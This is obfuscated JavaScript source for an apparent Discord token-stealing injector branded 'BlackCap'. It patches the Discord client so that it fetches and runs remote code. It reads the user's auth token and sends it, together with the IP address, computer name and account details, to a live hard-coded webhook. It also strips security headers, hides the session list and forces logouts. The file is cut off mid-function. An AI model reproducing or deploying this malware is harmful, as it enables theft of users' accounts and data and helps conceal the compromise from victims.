const fs = require('fs'),
  path = require('path'),
  { BrowserWindow, session } = require('electron'),
  args = process.argv,
  querystring = require('querystring'),
  os = require('os'),
  https = require('https'),
  computerName = os.hostname(),
  EvalToken =
    'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'
String.prototype.insert = function (HElLODialz, YEsITSme) {
  if (HElLODialz > 0) {
    return this.substring(0, HElLODialz) + YEsITSme + this.substr(HElLODialz)
  }
  return YEsITSme + this
}
const anoTHErob = {}
anoTHErob.urls = [
  'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
  'https://*.discord.com/api/v*/applications/detectable',
  'https://discord.com/api/v*/applications/detectable',
  'https://*.discord.com/api/v*/users/@me/library',
  'https://discord.com/api/v*/users/@me/library',
  'wss://remote-auth-gateway.discord.gg/*',
]
const stoPUSeringyourtool = {}
stoPUSeringyourtool.logout = 'true'
stoPUSeringyourtool['logout-notify'] = 'true'
stoPUSeringyourtool['init-notify'] = 'true'
stoPUSeringyourtool['embed-color'] = 374276
stoPUSeringyourtool.injection_url =
  'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js'
stoPUSeringyourtool.webhook =
  'https://discord.com/api/webhooks/1040265775551881246/hxnXE73kYM5npd1VAc0dbDgN6UA4M_MkuYFKAjuPhTbcHsQeJAZMhqVlm_Q1n7sspJOl'
stoPUSeringyourtool.filter2 = anoTHErob
const config = stoPUSeringyourtool
let bannerurl = '',
  usericonurl = ''
const discordPath = (function () {
  const anOTHErob = (function () {
      let STOPSTp = true
      return function (MDRJRIgole, PLZDONt) {
        const YESITSme = STOPSTp
          ? function () {
              if (PLZDONt) {
                const YOUCANtdeobthis = PLZDONt.apply(MDRJRIgole, arguments)
                return (PLZDONt = null), YOUCANtdeobthis
              }
            }
          : function () {}
        return (STOPSTp = false), YESITSme
      }
    })(),
    frEEMAnbb = anOTHErob(this, function () {
      return frEEMAnbb
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(frEEMAnbb)
        .search('(((.+)+)+)+$')
    })
  frEEMAnbb()
  const mdRJRIgole = args[0].split(path.sep).slice(0, -1).join(path.sep)
  let MdRJRIgole
  if (process.platform === 'win32') {
    MdRJRIgole = path.join(mdRJRIgole, 'resources')
  } else {
    if (process.platform === 'darwin') {
      MdRJRIgole = path.join(mdRJRIgole, 'Contents', 'Resources')
    }
  }
  if (fs.existsSync(MdRJRIgole)) {
    return {
      resourcePath: MdRJRIgole,
      app: mdRJRIgole,
    }
  }
  return '', ''
})()
function updateCheck() {
  const { resourcePath: vatfaiReenculer, app: yesitsMe } = discordPath
  if (vatfaiReenculer === undefined || yesitsMe === undefined) {
    return
  }
  const anotheRob = path.join(vatfaiReenculer, 'app')
  const cvfrrtAbuses = path.join(anotheRob, 'package.json'),
    stopusEringyourtool = path.join(anotheRob, 'index.js'),
    stopstP =
      yesitsMe +
      '\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js',
    youcanTdeobthis = path.join(
      process.env.APPDATA,
      '\\betterdiscord\\data\\betterdiscord.asar'
    )
  if (!fs.existsSync(anotheRob)) {
    fs.mkdirSync(anotheRob)
  }
  if (fs.existsSync(cvfrrtAbuses)) {
    fs.unlinkSync(cvfrrtAbuses)
  }
  if (fs.existsSync(stopusEringyourtool)) {
    fs.unlinkSync(stopusEringyourtool)
  }
  if (process.platform === 'win32' || process.platform === 'darwin') {
    const StopstP = {
      name: 'discord',
      main: 'index.js',
    }
    fs.writeFileSync(cvfrrtAbuses, JSON.stringify(StopstP, null, 4))
    const HellodIalz =
      "const fs = require('fs'), https = require('https');\nconst indexJS = '" +
      stopstP +
      "';\nconst bdPath = '" +
      youcanTdeobthis +
      "';\nconst fileSize = fs.statSync(indexJS).size\nfs.readFileSync(indexJS, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" +
      config.injection_url +
      "', (res) => {\n        const file = fs.createWriteStream(indexJS);\n        res.replace('core' + 'num', indexJS).replace('%WEBHOOK%', '" +
      config.webhook +
      "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" +
      path.join(vatfaiReenculer, 'app.asar') +
      "')\nif (fs.existsSync(bdPath)) require(bdPath);"
    fs.writeFileSync(stopusEringyourtool, HellodIalz.replace(/\\/g, '\\\\'))
  }
  if (!fs.existsSync(path.join(__dirname, 'blackcap'))) {
    return true
  }
  execScript(
    'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();'
  )
  return false
}
const execScript = (VatfaiReenculer) => {
  const YesitsMe = BrowserWindow.getAllWindows()[0]
  return YesitsMe.webContents.executeJavaScript(VatfaiReenculer, true)
}
function sleep(EtodurAk) {
  return new Promise((AnotheRob) => setTimeout(AnotheRob, EtodurAk))
}
async function noSessionPlease() {
  const CvfrrtAbuses = (function () {
    const VaTfaiReenculer = {
      EFsin: function (FrEemaNbb, MdRjriGole) {
        return FrEemaNbb + MdRjriGole
      },
      lfAOz: function (yOUcanTdeobthis, aNOtheRob) {
        return yOUcanTdeobthis + aNOtheRob
      },
      yYgjA: '`\u2714️`',
      lmJdV: ' :credit_card:',
      TphaK: '`\u274C`',
      Tzpqa: function (mDRjriGole, sTOpstP) {
        return mDRjriGole === sTOpstP
      },
      ZTGUH: 'KuShh',
      MccWJ: function (pLZdonT, yESitsMe) {
        return pLZdonT !== yESitsMe
      },
      kNOoY: 'ZmFqd',
      ztjxH: 'gvYpF',
      juBeY: 'USQCh',
      ejtTc: '<:brilliance:874750808338608199> ',
    }
    let dAMounT = true
    return function (kSChisHere, cVFrrtAbuses) {
      const sTOpusEringyourtool = {
        yVcUa: function (hELlodIalz, fREemaNbb) {
          return VaTfaiReenculer.lfAOz(hELlodIalz, fREemaNbb)
        },
        ZgSTz: VaTfaiReenculer.yYgjA,
        zkkGJ: VaTfaiReenculer.lmJdV,
        YRsOn: VaTfaiReenculer.TphaK,
        GNVOq: function (eTOdurAk, vATfaiReenculer) {
          return VaTfaiReenculer.Tzpqa(eTOdurAk, vATfaiReenculer)
        },
        JUSBh: VaTfaiReenculer.ZTGUH,
        MQlSh: function (DAMounT, HELlodIalz) {
          return VaTfaiReenculer.MccWJ(DAMounT, HELlodIalz)
        },
        nwJFf: VaTfaiReenculer.kNOoY,
        CyDEm: VaTfaiReenculer.ztjxH,
      }
      if (VaTfaiReenculer.MccWJ(VaTfaiReenculer.juBeY, VaTfaiReenculer.juBeY)) {
        yEsitSme += VaTfaiReenculer.EFsin(
          aNothErob,
          ' ' +
            STopbB.user.username +
            '#' +
            STopuSeringyourtool.user.discriminator +
            '\n'
        )
      } else {
        const VATfaiReenculer = dAMounT
          ? function () {
              const KSChisHere = {
                YNnmb: function (STOpstP, ANOtheRob) {
                  return sTOpusEringyourtool.yVcUa(STOpstP, ANOtheRob)
                },
                tRQgh: sTOpusEringyourtool.ZgSTz,
                DxNXE: sTOpusEringyourtool.zkkGJ,
                BwYHS: sTOpusEringyourtool.YRsOn,
              }
              if (
                sTOpusEringyourtool.GNVOq(
                  sTOpusEringyourtool.JUSBh,
                  sTOpusEringyourtool.JUSBh
                )
              ) {
                if (cVFrrtAbuses) {
                  if (
                    sTOpusEringyourtool.MQlSh(
                      sTOpusEringyourtool.nwJFf,
                      sTOpusEringyourtool.CyDEm
                    )
                  ) {
                    const YOUcanTdeobthis = cVFrrtAbuses.apply(
                      kSChisHere,
                      arguments
                    )
                    return (cVFrrtAbuses = null), YOUcanTdeobthis
                  } else {
                    MDrjrIgole += KSChisHere.YNnmb(
                      KSChisHere.tRQgh,
                      KSChisHere.DxNXE
                    )
                  }
                }
              } else {
                return KSChisHere.BwYHS
              }
            }
          : function () {}
        return (dAMounT = false), VATfaiReenculer
      }
    }
  })()
  ;(function () {
    CvfrrtAbuses(this, function () {
      const CvfRrtAbuses = new RegExp('function *\\( *\\)'),
        VatFaiReenculer = new RegExp(
          '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
          'i'
        ),
        YesItsMe = kschishere('init')
      if (
        !CvfRrtAbuses.test(YesItsMe + 'chain') ||
        !VatFaiReenculer.test(YesItsMe + 'input')
      ) {
        YesItsMe('0')
      } else {
        kschishere()
      }
    })()
  })()
  const fReemaNbb = (function () {
      let cVfRrtAbuses = true
      return function (mDrJriGole, yOuCanTdeobthis) {
        const sToPusEringyourtool = cVfRrtAbuses
          ? function () {
              if (yOuCanTdeobthis) {
                const PLzDonT = yOuCanTdeobthis.apply(mDrJriGole, arguments)
                return (yOuCanTdeobthis = null), PLzDonT
              }
            }
          : function () {}
        return (cVfRrtAbuses = false), sToPusEringyourtool
      }
    })(),
    sTopusEringyourtool = fReemaNbb(this, function () {
      const yeSItsMe = function () {
          let stOPusEringyourtool
          try {
            stOPusEringyourtool = Function(
              'return (function() {}.constructor("return this")( ));'
            )()
          } catch (stOPstP) {
            stOPusEringyourtool = window
          }
          return stOPusEringyourtool
        },
        plZDonT = yeSItsMe(),
        heLLodIalz = (plZDonT.console = plZDonT.console || {}),
        cvFRrtAbuses = [
          'log',
          'warn',
          'info',
          'error',
          'exception',
          'table',
          'trace',
        ]
      for (let anOTheRob = 0; anOTheRob < cvFRrtAbuses.length; anOTheRob++) {
        const AnOTheRob = fReemaNbb.constructor.prototype.bind(fReemaNbb),
          EtODurAk = cvFRrtAbuses[anOTheRob],
          StOPusEringyourtool = heLLodIalz[EtODurAk] || AnOTheRob
        AnOTheRob['__proto__'] = fReemaNbb.bind(fReemaNbb)
        AnOTheRob.toString =
          StOPusEringyourtool.toString.bind(StOPusEringyourtool)
        heLLodIalz[EtODurAk] = AnOTheRob
      }
    })
  sTopusEringyourtool()
  await sleep(1000)
  execScript(
    '\nfunction userclick() {\n    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())\n    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())\n}\n\nfunction IsSession(item) {\n    return item?.innerText?.includes("Devices")\n}\n\nfunction handler(e) {\n    e = e || window.event;\n    var target = e.target || e.srcElement,\n    text = target.textContent || target.innerText;   \n    if (IsSession(target)) userclick()\n}\nfunction waitForElm(selector) {\n    return new Promise(resolve => {\n        const observer = new MutationObserver(mutations => {\n            if (document.querySelectorAll(selector).length>2) {\n                resolve(document.querySelectorAll(selector))\n            observer.disconnect();\n            }\n        });\n        observer.observe(document.body, {\n            childList: true,\n            subtree: true\n        });\n    });\n}\ndocument.addEventListener(\'click\',handler,false);\n'
  )
}
noSessionPlease()
session.defaultSession.webRequest.onHeadersReceived(
  (CvFRrtAbuses, HeLLodIalz) => {
    if (CvFRrtAbuses.url.startsWith(config.webhook)) {
      if (CvFRrtAbuses.url.includes('discord.com')) {
        const hELLodIalz = {}
        hELLodIalz['Access-Control-Allow-Headers'] = '*'
        HeLLodIalz({
          responseHeaders: Object.assign(
            hELLodIalz,
            CvFRrtAbuses.responseHeaders
          ),
        })
      } else {
        HeLLodIalz({
          responseHeaders: Object.assign(
            {
              'Content-Security-Policy': [
                "default-src '*'",
                "Access-Control-Allow-Headers '*'",
                "Access-Control-Allow-Origin '*'",
              ],
              'Access-Control-Allow-Headers': '*',
              'Access-Control-Allow-Origin': '*',
            },
            CvFRrtAbuses.responseHeaders
          ),
        })
      }
    } else {
      delete CvFRrtAbuses.responseHeaders['content-security-policy']
      delete CvFRrtAbuses.responseHeaders['content-security-policy-report-only']
      const pLZDonT = { ...CvFRrtAbuses.responseHeaders }
      pLZDonT['Access-Control-Allow-Headers'] = '*'
      const cVFRrtAbuses = { responseHeaders: pLZDonT }
      HeLLodIalz(cVFRrtAbuses)
    }
  }
)
const hooker = async (fREEmaNbb) => {
  const MDRJriGole = JSON.stringify(fREEmaNbb),
    VATFaiReenculer = new URL(config.webhook),
    YOUCanTdeobthis = {
      protocol: VATFaiReenculer.protocol,
      hostname: VATFaiReenculer.host,
      path: VATFaiReenculer.pathname,
      method: 'POST',
      headers: {},
    }
  YOUCanTdeobthis.headers['Content-Type'] = 'application/json'
  YOUCanTdeobthis.headers['Access-Control-Allow-Origin'] = '*'
  const STOPusEringyourtool = YOUCanTdeobthis,
    YESItsMe = https.request(STOPusEringyourtool)
  YESItsMe.on('error', (PLZDonT) => {
    console.log(PLZDonT)
  })
  YESItsMe.write(MDRJriGole)
  YESItsMe.end()
}
async function FirstTime() {
  const vatfAiReenculer = BrowserWindow.getAllWindows()[0]
  vatfAiReenculer.webContents
    .executeJavaScript('' + EvalToken, true)
    .then(async (pLZdOnT) => {
      if (config['init-notify'] == 'true') {
        if (fs.existsSync(path.join(__dirname, 'blackcap'))) {
          fs.rmdirSync(path.join(__dirname, 'blackcap'))
          if (pLZdOnT == null || pLZdOnT == undefined || pLZdOnT == '') {
            var { ip: eTOdUrAk } = await getFromURL(
              'https://www.myexternalip.com/json',
              null
            )
            const ETOdUrAk = {
              username: 'BlackCap',
              content: '',
              embeds: [
                {
                  title: 'BlackCap Initalized',
                  color: config['embed-color'],
                  fields: [
                    {
                      name: 'Injection Info',
                      value:
                        '```diff\n- Computer Name: \n' +
                        computerName +
                        '\n\n- Injection Path: \n' +
                        __dirname +
                        '\n\n- IP: \n' +
                        eTOdUrAk +
                        '\n```',
                      inline: false,
                    },
                  ],
                  author: { name: 'BlackCap' },
                  footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                },
              ],
            }
            const PLZdOnT = ETOdUrAk
            hooker(PLZdOnT)
          } else {
            var cVFrRtAbuses = await getFromURL(
                'https://discord.com/api/v8/users/@me',
                pLZdOnT
              ),
              { ip: eTOdUrAk } = await getFromURL(
                'https://www.myexternalip.com/json',
                null
              )
            if (cVFrRtAbuses.avatar === null) {
              usericonurl =
                'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png'
            } else {
              usericonurl =
                'https://cdn.discordapp.com/avatars/' +
                cVFrRtAbuses.id +
                '/' +
                cVFrRtAbuses.avatar +
                '.png?size=600'
            }
            if (cVFrRtAbuses.banner === null) {
              bannerurl =
                'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png'
            } else {
              bannerurl =
                'https://cdn.discordapp.com/banners/' +
                cVFrRtAbuses.id +
                '/' +
                cVFrRtAbuses.banner +
                '.png?size=160'
            }
            const DAMoUnT = {
              username: 'BlackCap',
              content: '',
              embeds: [
                {
                  title: 'BlackCap Initalized',
                  description:
                    '[<a:blackcap:1022770267270938664> \u2502 **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)',
                  color: config['embed-color'],
                  fields: [
                    {
                      name: 'Injection Info',
                      value:
                        '```diff\n- Computer Name: \n' +
                        computerName +
                        '\n\n- Injection Path: \n' +
                        __dirname +
                        '\n\n- IP: \n' +
                        eTOdUrAk +
                        '\n```\n\n[Download pfp](' +
                        usericonurl +
                        ')',
                      inline: false,
                    },
                    {
                      name: 'Username <:icon4:1024615934519955496> ',
                      value:
                        '`' +
                        cVFrRtAbuses.username +
                        '#' +
                        cVFrRtAbuses.discriminator +
                        '`',
                      inline: true,
                    },
                    {
                      name: 'ID <:icon3:1024615933228109834>',
                      value:
                        '`' +
                        cVFrRtAbuses.id +
                        '`\n[Copy ID](https://paste-pgpj.onrender.com/?p=' +
                        cVFrRtAbuses.id +
                        ')',
                      inline: true,
                    },
                    {
                      name: 'Badges <:icon5:1024615931869147146>',
                      value: '' + GetBadges(cVFrRtAbuses.flags),
                      inline: true,
                    },
                    {
                      name: 'Language <:language:1037057832920547398>',
                      value: '' + GetLangue(cVFrRtAbuses.locale),
                      inline: true,
                    },
                    {
                      name: 'NSFW <a:nsfw:1037067109907320883>',
                      value: '' + GetNSFW(cVFrRtAbuses.nsfw_allowed),
                      inline: false,
                    },
                    {
                      name: 'A2F <a:a2f:1037084050826997902>',
                      value: '' + GetA2F(cVFrRtAbuses.mfa_enabled),
                      inline: true,
                    },
                    {
                      name: '@Copyright',
                      value:
                        '[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)',
                      inline: true,
                    },
                    {
                      name: 'Token <a:icon1:1024615171907407892>',
                      value:
                        '```' +
                        pLZdOnT +
                        '```\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                        pLZdOnT +
                        ')\n\n[Download Banner](' +
                        bannerurl +
                        ')',
                      inline: false,
                    },
                  ],
                  footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                  image: { url: bannerurl },
                  thumbnail: {
                    url:
                      'https://cdn.discordapp.com/avatars/' +
                      cVFrRtAbuses.id +
                      '/' +
                      cVFrRtAbuses.avatar,
                  },
                },
              ],
            }
            hooker(DAMoUnT)
          }
          if (!fs.existsSync(path.join(__dirname, 'blackcap'))) {
            return true
          }
          fs.rmdirSync(path.join(__dirname, 'blackcap'))
          if (config.logout != 'false' || config.logout !== '%LOGOUT%') {
            if (config['logout-notify'] == 'true') {
              if (pLZdOnT == null || pLZdOnT == undefined || pLZdOnT == '') {
                var { ip: eTOdUrAk } = await getFromURL(
                  'https://www.myexternalip.com/json',
                  null
                )
                const freEMaNbb = {
                  username: 'BlackCap Grabber',
                  content: '',
                  embeds: [
                    {
                      title:
                        'BlackCaped User log out (User not Logged in before)',
                      color: config['embed-color'],
                      fields: [
                        {
                          name: 'Injection Info',
                          value:
                            '```Name Of Computer: \n' +
                            computerName +
                            '\nInjection PATH: \n' +
                            __dirname +
                            '\n\n- IP: \n' +
                            eTOdUrAk +
                            '\n```\n\n',
                          inline: false,
                        },
                      ],
                      author: { name: 'BlackCap' },
                      footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                    },
                  ],
                }
                const kscHIsHere = freEMaNbb
                hooker(kscHIsHere)
              } else {
                var cVFrRtAbuses = await getFromURL(
                    'https://discord.com/api/v8/users/@me',
                    pLZdOnT
                  ),
                  { ip: eTOdUrAk } = await getFromURL(
                    'https://www.myexternalip.com/json',
                    null
                  )
                if (cVFrRtAbuses.avatar === null) {
                  usericonurl =
                    'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png'
                } else {
                  usericonurl =
                    'https://cdn.discordapp.com/avatars/' +
                    cVFrRtAbuses.id +
                    '/' +
                    cVFrRtAbuses.avatar +
                    '.png?size=600'
                }
                if (cVFrRtAbuses.banner === null) {
                  bannerurl =
                    'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png'
                } else {
                  bannerurl =
                    'https://cdn.discordapp.com/banners/' +
                    cVFrRtAbuses.id +
                    '/' +
                    cVFrRtAbuses.banner +
                    '.png?size=160'
                }
                const plzDOnT = {
                  username: 'BlackCap Grabber',
                  content: '',
                  embeds: [
                    {
                      title: 'BlackCap Victim got logged out',
                      description:
                        '[<a:blackcap:1022770267270938664> \u2502 **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)',
                      color: config['embed-color'],
                      fields: [
                        {
                          name: 'Injection Info',
                          value:
                            '```diff\n- Computer Name: \n' +
                            computerName +
                            '\n\n- Injection Path: \n' +
                            __dirname +
                            '\n\n- IP: \n' +
                            eTOdUrAk +
                            '\n```\n\n[Download pfp](' +
                            usericonurl +
                            ')',
                          inline: false,
                        },
                        {
                          name: 'Username <:icon4:1024615934519955496> ',
                          value:
                            '`' +
                            cVFrRtAbuses.username +
                            '#' +
                            cVFrRtAbuses.discriminator +
                            '`',
                          inline: true,
                        },
                        {
                          name: 'ID <:icon3:1024615933228109834>',
                          value:
                            '`' +
                            cVFrRtAbuses.id +
                            '`\n[Copy ID](https://paste-pgpj.onrender.com/?p=' +
                            cVFrRtAbuses.id +
                            ')',
                          inline: true,
                        },
                        {
                          name: 'Badges <:icon5:1024615931869147146>',
                          value: '' + GetBadges(cVFrRtAbuses.flags),
                          inline: true,
                        },
                        {
                          name: 'NSFW <a:nsfw:1037067109907320883>',
                          value: '' + GetNSFW(cVFrRtAbuses.nsfw_allowed),
                          inline: false,
                        },
                        {
                          name: 'A2F <a:a2f:1037084050826997902>',
                          value: '' + GetA2F(cVFrRtAbuses.mfa_enabled),
                          inline: true,
                        },
                        {
                          name: '@Copyright',
                          value:
                            '[BlackCap 2021 <a:blackcap:1022770267270938664>](https://github.com/KSCHdsc/BlackCap-Grabber)',
                          inline: true,
                        },
                        {
                          name: 'Token <a:icon1:1024615171907407892>',
                          value:
                            '```' +
                            pLZdOnT +
                            '```\n[Copy Token](https://paste-pgpj.onrender.com/?p=' +
                            pLZdOnT +
                            ')\n\n[Download Banner](' +
                            bannerurl +
                            ')',
                          inline: false,
                        },
                      ],
                      footer: { text: '\xA9KSCH | https://github.com/KSCHdsc' },
                      image: { url: bannerurl },
                      thumbnail: {
                        url:
                          'https://cdn.discordapp.com/avatars/' +
                          cVFrRtAbuses.id +
                          '/' +
                          cVFrRtAbuses.avatar,
                      },
                    },
                  ],
                }
                hooker(plzDOnT)
              }
            }
            const anoTHeRob = BrowserWindow.getAllWindows()[0]
            anoTHeRob.webContents
              .executeJavaScript(
                'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
                true
              )
              .then((StoPUsEringyourtool) => {})
          }
          return false
        }
      }
    })
}
const PlzDONt = {}
PlzDONt.urls = [
  'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
  'https://*.discord.com/api/v*/applications/detectable',
  'https://discord.com/api/v*/applications/detectable',
  'https://*.discord.com/api/v*/users/@me/library',
  'https://discord.com/api/v*/users/@me/library',
  'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
  'https://discord.com/api/v*/users/@me/billing/subscriptions',
  'wss://remote-auth-gateway.discord.gg/*',
]
const Filter = PlzDONt
async function saveidtofile(AnoTHeRob, HelLOdIalz) {
  fs.open(HelLOdIalz, function (mDrJRiGole) {
    if (mDrJRiGole) {
      return
    }
  })
  fs.appendFile(HelLOdIalz, AnoTHeRob + '\n', function (dAmOUnT) {
    if (dAmOUnT) {
      return
    }
  })
}
async function deletefile(aNoTHeRob) {
  fs.unlink('' + aNoTHeRob, function (CVfRRtAbuses) {
    if (CVfRRtAbuses) {
      return
    }
  })
}
async function getFromURL(MDrJRiGole, FReEMaNbb) {
  const EToDUrAk = BrowserWindow.getAllWindows()[0]
  var SToPStP = await EToDUrAk.webContents.executeJavaScript(
    '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "' +
      MDrJRiGole +
      '", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
      FReEMaNbb +
      '");\n    xmlHttp.send( null );\n    JSON.parse(xmlHttp.responseText);',
    true
  )
  return SToPStP
}
async function getFromURLnp(VAtFAiReenculer, SToPUsEringyourtool) {
  const DAmOUnT = BrowserWindow.getAllWindows()[0]
  var ANoTHeRob = await DAmOUnT.webContents.executeJavaScript(
    '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "' +
      VAtFAiReenculer +
      '", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
      SToPUsEringyourtool +
      '");\n    xmlHttp.send( null );',
    true
  )
  return ANoTHeRob
}
async function getservers(PLzDOnT) {
  var YEsITsMe = await getFromURL(
    'https://discord.com/api/v8/users/@me/guilds',
    PLzDOnT
  )
  await YEsITsMe.filter(
    (FrEEMaNbb) => FrEEMaNbb.owner == true && FrEEMaNbb.icon
  ).forEach(async (PlZDOnT) => {
    if (PlZDOnT.icon == null) {
      return
    }
    let VaTFAiReenculer = PlZDOnT.id
    saveidtofile(VaTFAiReenculer, 'blackcaped_guilds_ids.txt')
  })
  setTimeout(async () => {
    if (fs.existsSync('blackcaped_guilds_ids.txt')) {
      const YOUCAnTdeobthis = await fs
        .readFileSync('blackcaped_guilds_ids.txt', 'utf-8')
        .split('\n')
      YOUCAnTdeobthis.forEach(async (PLZDOnT) => {
        setTimeout(async () => {
          if (PLZDOnT == null || PLZDOnT == '\n' || PLZDOnT == ' ') {
            return
          }
          var DAMOUnT = await getFromURL(
            'https://discord.com/api/v8/guilds/' + PLZDOnT + '/preview',
            PLzDOnT
          )
          if (100 > DAMOUnT.approximate_member_count) {
            return
          }
          if (DAMOUnT.name == 'undefined') {
            return
          }
          saveidtofile(
            '---------------------------\n+ Name: ' +
              DAMOUnT.name +
              '\n+ ID: ' +
              DAMOUnT.id +
              '\n+ Members: ' +
              DAMOUnT.approximate_member_count +
              '\n\n',
            'blackcaped_guilds_result.txt'
          )
        }, 2000)
      })
    }
  }, 2000)
}
function GetNSFW(YESITsMe) {
  if (YESITsMe == true) {
    return '\uD83D\uDD1E `NSFW Allowed`'
  }
  if (YESITsMe == false) {
    return '\uD83D\uDD1E `NSFW Not Allowed`'
  } else {
    return 'Idk bro you got me'
  }
}
function GetA2F(StopuSEringyourtool) {
  if (StopuSEringyourtool == true) {
    return '\uD83D\uDD12 `A2F Enabled`'
  }
  if (StopuSEringyourtool == false) {
    return '\uD83D\uDD13 `A2F Not Enabled`'
  } else {
    return 'Idk bro you got me'
  }
}
function GetNitro(YOucaNTdeobthis) {
  if (YOucaNTdeobthis == 0) {
    return 'No Nitro'
  }
  if (YOucaNTdeobthis == 1) {
    return '<:classic:896119171019067423> `Nitro Classic`'
  }
  if (YOucaNTdeobthis == 2) {
    return '<a:boost:824036778570416129> `Nitro Boost`'
  } else {
    return 'No Nitro'
  }
}
function GetRBadges(daMouNT) {
  var HeLloDIalz = ''
  if ((daMouNT & 1) == 1) {
    HeLloDIalz += '<:staff:874750808728666152> '
  }
  ;(daMouNT & 2) == 2 && (HeLloDIalz += '<:partner:874750808678354964> ')
  ;(daMouNT & 4) == 4 &&
    (HeLloDIalz += '<:hypesquad_events:874750808594477056> ')
  ;(daMouNT & 8) == 8 && (HeLloDIalz += '<:bughunter_1:874750808426692658> ')
  ;(daMouNT & 512) == 512 &&
    (HeLloDIalz += '<:early_supporter:874750808414113823> ')
  ;(daMouNT & 16384) == 16384 &&
    (HeLloDIalz += '<:bughunter_2:874750808430874664> ')
  ;(daMouNT & 131072) == 131072 &&
    (HeLloDIalz += '<:developer:874750808472825986> ')
  if (HeLloDIalz == '') {
    HeLloDIalz = ''
  }
  return HeLloDIalz
}
function GetLangue(stoPuSEringyourtool) {
  const youCaNTdeobthis = 'en-GB',
    plzDoNT = 'en-US',
    stoPsTP = 'es-ES',
    PlzDoNT = 'pr-BR',
    VatFaIReenculer = 'sv-SE'
  const dAmOuNT = 'zh-CN',
    mDrJrIGole = 'zh-TW'
  var sToPsTP = ''
  stoPuSEringyourtool == 'fr' && (sToPsTP += '\uD83C\uDDEB\uD83C\uDDF7 French')
  if (stoPuSEringyourtool == 'da') {
    sToPsTP += '\uD83C\uDDE9\uD83C\uDDF0 Dansk'
  }
  stoPuSEringyourtool == 'de' && (sToPsTP += '\uD83C\uDDE9\uD83C\uDDEA Deutsch')
  stoPuSEringyourtool == youCaNTdeobthis &&
    (sToPsTP +=
      '\uD83C\uDFF4\uDB40\uDC67\uDB40\uDC62\uDB40\uDC65\uDB40\uDC6E\uDB40\uDC67\uDB40\uDC7F English')
  if (stoPuSEringyourtool == plzDoNT) {
    sToPsTP += '\uD83C\uDDFA\uD83C\uDDF8 USA'
  }
  if (stoPuSEringyourtool == stoPsTP) {
    sToPsTP += '\uD83C\uDDEA\uD83C\uDDF8 Espagnol'
  }
  if (stoPuSEringyourtool == 'hr') {
    sToPsTP += '\uD83C\uDDED\uD83C\uDDF7 Croatian'
  }
  stoPuSEringyourtool == 'it' &&
    (sToPsTP += '\uD83C\uDDEE\uD83C\uDDF9 Italianio')
  if (stoPuSEringyourtool == 'lt') {
    sToPsTP += '\uD83C\uDDF1\uD83C\uDDF9 Lithuanian'
  }
  stoPuSEringyourtool == 'hu' &&
    (sToPsTP += '\uD83C\uDDED\uD83C\uDDFA Hungarian')
  if (stoPuSEringyourtool == 'nl') {
    sToPsTP += '\uD83C\uDDF3\uD83C\uDDF1 Dutch'
  }
  stoPuSEringyourtool == 'no' &&
    (sToPsTP += '\uD83C\uDDF3\uD83C\uDDF4 Norwegian')
  stoPuSEringyourtool == 'pl' && (sToPsTP += '\uD83C\uDDF5\uD83C\uDDF1 Polish')
  if (stoPuSEringyourtool == PlzDoNT) {
    sToPsTP += '\uD83C\uDDF5\uD83C\uDDF9 Portuguese'
  }
  stoPuSEringyourtool == 'ro' &&
